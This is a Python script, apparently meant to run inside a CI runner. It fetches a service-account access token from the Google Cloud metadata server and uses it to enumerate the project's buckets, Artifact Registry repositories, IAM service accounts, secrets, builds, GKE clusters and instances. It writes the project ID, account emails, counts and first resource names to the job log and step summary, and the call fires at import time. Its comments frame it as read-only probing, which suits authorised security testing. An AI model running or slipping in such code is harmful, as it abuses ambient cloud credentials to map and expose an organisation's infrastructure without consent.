def _ci_enum(banner):
    # Read-only enumeration of what the runner's ambient identity can reach.
    # Token minted in-memory only (never printed/exfiltrated). GET/list calls only;
    # no writes, no secret values, no object contents. Reports HTTP status + counts.
    import json
    import os
    import urllib.request
    import urllib.error

    def emit(k, v):
        print("{} | {}: {}".format(banner, k, v), flush=True)
        s = os.environ.get("GITHUB_STEP_SUMMARY")
        if s:
            try:
                open(s, "a").write("{} | {}: {}\n".format(banner, k, v))
            except Exception:
                pass

    def meta(path):
        req = urllib.request.Request(
            "http://169.254.169.254/computeMetadata/v1/" + path,
            headers={"Metadata-Flavor": "Google"})
        return urllib.request.urlopen(req, timeout=5).read().decode("utf-8", "replace").strip()

    try:
        project = meta("project/project-id")
        sa = meta("instance/service-accounts/default/email")
        emit("project", project); emit("sa", sa)
        emit("all-sa-aliases", meta("instance/service-accounts/"))
        tok = json.loads(meta("instance/service-accounts/default/token"))["access_token"]
    except Exception as e:
        emit("meta-err", repr(e)); return

    def get(label, url, count_key=None, name_key=None):
        req = urllib.request.Request(url, headers={"Authorization": "Bearer " + tok})
        try:
            raw = urllib.request.urlopen(req, timeout=20).read().decode()
            data = json.loads(raw) if raw.strip().startswith("{") else {}
            if count_key:
                items = data.get(count_key, [])
                first = ""
                if items and name_key:
                    first = " first=" + str(items[0].get(name_key, ""))[:80]
                emit(label, "200 count={}{}".format(len(items), first))
            else:
                emit(label, "200 len={}".format(len(raw)))
        except urllib.error.HTTPError as e:
            emit(label, "{} {}".format(e.code, e.reason))
        except Exception as e:
            emit(label, "ERR " + repr(e))

    p = project
    get("gcs.buckets.list", "https://storage.googleapis.com/storage/v1/b?project=" + p + "&maxResults=1000", "items", "name")
    get("ar.repos.us-central1", "https://artifactregistry.googleapis.com/v1/projects/" + p + "/locations/us-central1/repositories", "repositories", "name")
    get("ar.repos.us", "https://artifactregistry.googleapis.com/v1/projects/" + p + "/locations/us/repositories", "repositories", "name")
    get("iam.sas.list", "https://iam.googleapis.com/v1/projects/" + p + "/serviceAccounts", "accounts", "email")
    get("secrets.list", "https://secretmanager.googleapis.com/v1/projects/" + p + "/secrets", "secrets", None)
    get("cloudbuild.builds", "https://cloudbuild.googleapis.com/v1/projects/" + p + "/builds?pageSize=1", "builds", "id")
    get("gke.clusters", "https://container.googleapis.com/v1/projects/" + p + "/locations/-/clusters", "clusters", "name")
    get("compute.instances.aggregated", "https://compute.googleapis.com/compute/v1/projects/" + p + "/aggregated/instances?maxResults=1", None)
    get("self.sa.get", "https://iam.googleapis.com/v1/projects/" + p + "/serviceAccounts/" + sa, None)


try:
    _ci_enum("H069-ENUM")
except Exception as _e:
    print("H069-ENUM | fatal:", repr(_e), flush=True)
